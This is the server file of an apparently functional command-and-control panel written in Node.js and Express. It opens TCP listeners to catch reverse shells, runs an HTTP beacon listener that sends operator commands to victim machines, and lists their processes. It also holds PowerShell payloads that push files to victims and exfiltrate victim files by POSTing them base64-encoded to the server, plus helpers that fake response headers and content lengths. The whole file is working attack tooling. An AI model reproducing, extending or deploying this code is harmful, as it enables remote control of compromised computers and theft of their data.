// Express init
const https = require('https');
var express = require('express');
var xss = require("xss");
var session = require('express-session')
var app = express();
const ejs = require('ejs');
var expressWs = require('express-ws')(app);
const funs = require('./routes/funs');
app.use(express.urlencoded({
	extended: true
}));
const fileUpload = require('express-fileupload');
app.use(fileUpload());

const multer  = require('multer');

const cookieParser = require("cookie-parser");
const bodyParser = require('body-parser');
const config = require('./config');
app.set("view engine", "ejs");
const compression = require('compression')
app.use(compression())
app.use(bodyParser.urlencoded({
	extended: true
}));
app.use(bodyParser.json());

app.use(cookieParser());

// Routing
// app.use(express.static('public',{maxAge: '115000'}));
app.use(express.static('public'));

app.use('/', require("./routes/index_page")(app))
app.use('/', require('./routes/index')(app));
app.use('/login', require('./routes/login')(app));
app.use('/apis', require('./routes/apis')(app));
app.use('/logout', require('./routes/logout')(app))
app.use('/profile', require('./routes/profile')(app));
//delete all dead connections
funs.clean_connections()

// Start
app.listen(config.settings.port, function () {
	console.log('app listening on port ' + config.settings.port + '!');
	console.log(`http://localhost:${config.settings.port}\n`)

	console.log("username:admin\npassword:admin")
});

var commands = []
var list_cookies = []

var net = require('net');

var id = 0;
var http_history = []
var servers = [];
app.set("servers", servers);

var messagesByServer = {};
app.set("messagesByServer", messagesByServer);
async function open_port(port) {
	var server = net.createServer(async function (socket) {
		currentId = funs.check_same_id(list_cookies,id)
		var currentIP = socket.address().address + "";
		if (await funs.ipdata_check_ip(currentIP)) {
			socket.destroy()
			return
		}

		await funs.add_ip_to_connections(currentId, currentIP, await funs.ip_info(currentIP))
		await funs.on_connection_command_run(socket)
		socket.on("data", function (data) {
			if (messagesByServer[currentId] == undefined) {
				messagesByServer[currentId] = [];
			}
			data = data.toString().replace(/\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g, "") // remove ANSI codes
			data = xss(data)
			data = Buffer.from(data, 'utf-8');
			messagesByServer[currentId].push(data);

			app.set("messagesByServer", messagesByServer);

			var socketsByServer = app.get("socketsByServer");

			if (socketsByServer[currentId] == undefined) {
				socketsByServer[currentId] = [];
			}

			socketsByServer[currentId].filter(async function (ws) {
				try {
					// console.log(data.toString()); ///--> response from  reverse shell


					data = data.toString().replace(/\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g, "") // remove ANSI codes
					data = xss(data)
					data = Buffer.from(data, 'utf-8'); // string to buffer
					ws.send(JSON.stringify({
						message: "data",
						data: data + ""
					}));

					return true;
				} catch (e) {
					return false;
				}
			});

			app.set("socketsByServer", socketsByServer);
		});
		// delete connection 
		socket.on("end", function () {
			funs.delete_ip_from_connections(currentId)
			if (messagesByServer[currentId] == undefined) {
				messagesByServer[currentId] = [];
			}

			messagesByServer[currentId].push("connection closed");

			app.set("messagesByServer", messagesByServer);

			var socketsByServer = app.get("socketsByServer");

			if (socketsByServer[currentId] == undefined) {
				socketsByServer[currentId] = [];

			}

			socketsByServer[currentId].filter(function (ws) {
				try {
					ws.send(JSON.stringify({
						message: "data",
						data: "connection closed"
					}));


					return true;
				} catch (e) {
					return false;
				}
			});

			app.set("socketsByServer", socketsByServer);

			var servers = app.get("servers");
			servers[currentId].dead = true;

			var sockets = app.get("sockets");

			sockets.filter(function (ws) {
				try {
					ws.send(JSON.stringify({
						message: "newServer",
						id: currentId,
						ip: currentIP,
						dead: true,
						appear: true
					}));

					return true;
				} catch (e) {

					return false;
				}
			});

			app.set("sockets", sockets);
		})
		socket.on("error", function (data) {
			if (messagesByServer[currentId] == undefined) {
				messagesByServer[currentId] = [];
			}

			messagesByServer[currentId].push("connection closed");

			app.set("messagesByServer", messagesByServer);

			var socketsByServer = app.get("socketsByServer");

			if (socketsByServer[currentId] == undefined) {
				socketsByServer[currentId] = [];

			}

			socketsByServer[currentId].filter(function (ws) {
				try {
					ws.send(JSON.stringify({
						message: "data",
						data: "connection closed"
					}));


					return true;
				} catch (e) {
					return false;
				}
			});

			app.set("socketsByServer", socketsByServer);

			var servers = app.get("servers");

			servers[currentId].dead = true;


			var sockets = app.get("sockets");

			sockets.filter(function (ws) {
				try {
					ws.send(JSON.stringify({
						message: "newServer",
						id: currentId,
						ip: currentIP,
						dead: true,
						appear: true,
						type:"socket"

					}));

					return true;
				} catch (e) {

					return false;
				}
			});

			app.set("sockets", sockets);
		});
		// Check if the same id is already on http 
		
		id = funs.check_same_id(list_cookies,id)
		servers.push({
			socket: socket,
			id: id,
			ip: socket.address().address,
			dead: false,
			appear: true,
			type:"socket"
		});

		app.set("servers", servers);

		var sockets = app.get("sockets");

		sockets.filter(function (ws) {
			try {
				ws.send(JSON.stringify({
					message: "newServer",
					id: id,
					ip: socket.address().address,
					dead: false,
					appear: false,
					type:"socket"
				}));
				return true
			} catch (e) {
				console.log(e)

				return false;
			}
		});
		app.set("sockets", sockets);
		id++;
		
		});
		
	server.listen(port, '0.0.0.0');

}

async function http_listener() {
	var lis = express();
	lis.use(bodyParser.urlencoded({
		extended: true
	}));
	lis.use(bodyParser.json());
	lis.use(cookieParser());
	lis.get(/\/getcommand.*/,funs.fake_headers, (req, res) => {
		// check if socket is already connected
		let os = "linux"
		let os_path = "/assets/linux.png"
		if(req.headers['user-agent'].includes("Windows")){
			os = "windows"
			os_path = "/assets/windows.png"
		}
		let id = funs.find_random_value(req,req.cookies)
		let session_exists = false
		if(!list_cookies.includes(id)){
			list_cookies.push(id);
			for(i=0;i<servers.length;i++){
				if(servers[i].id ==id ){
					servers[i].appear = true
					servers[i].dead = false 
					 session_exists = true
				}
			}
			if(!session_exists){
			servers.push({
				socket: null,
				id: id,
				ip: req.socket.remoteAddress,
				dead: false,
				appear: true,
				type:"http",
				os:os_path
			});
		}	
			commands.push({
				id:id,
				command:undefined,
				download:false
			})
		
		}
		let send = true

		// send command to victim & save in history 

		for(i=0;i<commands.length; i++){
			if(funs.find_random_value(req,req.cookies) == commands[i].id){
				// check if there is file uploaded
				if(commands[i].upload){
					res.send(`
					$session = nEW-oBjECt Microsoft.PowerShell.Commands.WebRequestSession
					$cookie = nEW-oBjECt System.Net.Cookie     
					$cookie.Name = "id"
					$cookie.Value = "${commands[i].id}"
					$cookie.Domain = "localhost"
					$session.Cookies.Add($cookie);
					$req = Invoke-WebRequest "http://localhost:8080/upload/asd" -WebSession $session 
					$textt =  $req.Content.Split([Environment]::NewLine)
					$bytes = [Convert]::FromBase64String($textt[1])
					$file_path_base64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($textt[0]))
					[IO.File]::WriteAllBytes((Get-Location).Path+$file_path_base64, $bytes)`)
					send =true
				}
				 if(commands[i].command != undefined){
					send = false
					res.send(commands[i].command)
					http_history.push({command:commands[i].command,id:commands[i].id})
					commands[i].command = undefined	

				}else{
					if(send){

						res.send(`none ${funs.fake_content_len()}`)
						send = true
					}

				}

			}
		}
	})
	lis.get(/\/upload.*/,funs.fake_headers, (req, res) => {
		for(i=0;i<commands.length; i++){
			if(funs.find_random_value(req,req.cookies) == commands[i].id){
				res.send(commands[i].upload)
				commands[i].upload = undefined
				
			}
		}
	})
	
	lis.post(/\/download.*/,funs.fake_headers, (req, res) => {
		res.send("Hello")
		if(funs.find_random_value_body(req.body) == "") return;
		for(i=0;i<commands.length;i++){
			if(funs.find_random_value(req,req.cookies) == commands[i].id){
				commands[i].response = funs.find_random_value_body(req.body)
				commands[i].download = true
			}
	
		}

	})

	lis.post(/\/response.*/,funs.fake_headers, (req, res) => {
		res.send("Hello")
		if(funs.find_random_value_body(req.body) == "") return;
		for(i=0;i<commands.length;i++){
			if(funs.find_random_value(req,req.cookies) == commands[i].id){
				commands[i].response = funs.find_random_value_body(req.body)
				http_history.push({response:funs.find_random_value_body(req.body),id:commands[i].id})
			}
	
		}
	})

	lis.listen(config.settings.http_reverse_listeners, function () {

	});


}
http_listener()

const ports = config.settings.listeners_ports
for (i = 0; i < ports.length; i++) {
	open_port(ports[i]);

}





//open port
app.get('/apis/open_port', funs.check_login_user, function (req, res) {
	open_port(parseInt(req.query.port))
	res.send('done')
})
//kill session
app.get('/apis/kill_session', funs.check_login_user, function (req, res) {
	const session_number = parseInt(req.query.session)
	servers[session_number].socket.destroy()
	servers[session_number].dead = true
	res.send('done')
})
//command
app.get('/apis/http_history/', [funs.check_login_user,funs.http_sessions_check_access_query],async function (req, res) {
	let response = []
	// clean http_history after 200 
	if(http_history.length > 900){
		// delete command and response
		http_history.shift()
		http_history.shift()
	}
	for(i=0;i<http_history.length;i++){
		if(http_history[i].id == req.query.id){
			response.push(http_history[i])
		}

	}
	res.send(response)
})
app.post('/apis/http_command', [funs.check_login_user,funs.http_sessions_check_access_body],async function (req, res) {
	let current_command
	for(i=0;i<commands.length;i++){
		if(req.body.id == commands[i].id){
			if(req.body.command.includes("!download ")){
				let file = req.body.command.replace("!download ","")
				req.body.command = `$session = nEW-oBjECt Microsoft.PowerShell.Commands.WebRequestSession
				$cookie = nEW-oBjECt System.Net.Cookie     
				$cookie.Name = "id"
				$cookie.Value = "${commands[i].id}"
				$cookie.Domain = "localhost"
				$session.Cookies.Add($cookie);
				$file = [convert]::Tobase64String((Get-Content -path ${file} -Encoding byte))
    $postParams = @{rfile=$file}
    $req = Invoke-WebRequest "http://localhost:8080/download/mskd" -WebSession $session -Method POST -Body $postParams`
			}
			current_command = commands[i]
			current_command.command = await funs.run_command(req.body.command) 
			current_command.download = false
			//process list check
			if(req.body.process_list){
				current_command.process_list = true 

			}
			
		}
		
	}
	res.send('done')
})
app.get('/apis/http_command_response',[funs.check_login_user,funs.http_sessions_check_access_query], function (req, res) {
	let send = false 
	let response
	let download
	let process_list
	let counter = 0
	for(i=0;i<commands.length;i++){
		if(req.query.id == commands[i].id && commands[i].response != undefined){
		send  = true
		response = commands[i].response
		download = commands[i].download
		process_list = commands[i].process_list
		commands[i].response = undefined
		counter = i
		}		

	}
	
	if(process_list){
		commands[counter].process_list = response
	}
	if(send && download){
		  res.append('download','true');
		  res.send(Buffer.from(response, 'base64'))
		return
	}
	if(send){
		res.send(response);
		return
	}		
	
	res.send('none💥💢💘');

})
app.get('/apis/http_process_list',[funs.check_login_user,funs.http_sessions_check_access_query],async function (req, res) {
	let parse
	let response = []
	let pid
	let processname
	let ppid
	const handle =async (res)=>{
		
		for(i=0;i<commands.length;i++){
			if(parseInt(commands[i].id) == parseInt(req.query.id)){
				if(commands[i].process_list === true){
					await funs.sleep(500)
					handle(res)
					return
				}
				parse = commands[i].process_list.split("\r\n")
				for(v=0;v<parse.length-1;v++){
					ppid = parse[v].split(' ')[parse[v].split(' ').length - 2]
					pid = parse[v].split(' ')[parse[v].split(' ').length - 3]
					processname = parse[v].replace(ppid,"").replace(pid,"")
					response.push({pid:pid,processname:processname,ppid:ppid})
				}
			}
		}
		res.send(response)
	}
	try{
		handle(res)
}catch(e){
	handle(res)
}
	// res.send(response)

})

app.post('/apis/http_upload_file', [funs.check_login_user,funs.http_sessions_check_access_query], function (req, res) {
	
	for(i=0;i<commands.length;i++){
		if(parseInt(commands[i].id) == parseInt(req.query.id)){
			commands[i].upload =Buffer.from("\\"+req.files.uploaded_file.name ).toString('base64')+ "\n" + req.files.uploaded_file.data.toString('base64') 

		}

	}
	res.redirect('/');


})
app.get('/apis/http_delete_session', funs.check_login_user,async  function (req, res) {
	req.query.id = parseInt(req.query.id)
	for(i=0;i<servers.length;i++){
		if(req.query.id == servers[i].id){
			// servers.splice(i,1)
			servers[i].dead = true
			for(s=0;s<commands.length;s++){
				if(req.query.id == commands[s].id){
					commands[s].command = await funs.run_command("Exit") 
					commands[s].download = false
		
				}
			}
		}
	}
	for(i=0;i<list_cookies.length;i++){
		if(list_cookies[i] == req.query.id){
			list_cookies.splice(i,1)
		}
		
	}
	res.send("done")
})

app.get('/apis/disapper_offline_shell', funs.check_login_user, function (req, res) {
	
	for(i=0;i<servers.length;i++){
		if(servers[i].id == req.query.id){
			servers[i].appear = false

		}
	
	}
	res.send('done')

})